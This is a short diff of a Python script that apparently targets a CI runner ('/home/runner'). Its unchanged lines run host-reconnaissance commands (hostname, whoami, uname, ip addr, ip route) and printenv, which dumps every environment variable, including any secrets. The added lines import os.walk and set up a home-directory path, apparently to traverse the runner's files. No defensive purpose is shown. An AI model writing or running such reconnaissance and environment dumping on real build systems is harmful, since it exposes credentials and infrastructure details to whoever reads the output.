@@ -1,5 +1,13 @@
 #!/usr/bin/env python
 
+from subprocess import run
+from os import walk
+
+def emit(path):
+    print("emitting {}".format(path))
+
+home = ['/home/runner']
+
 run('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null')
 run('printenv')
 
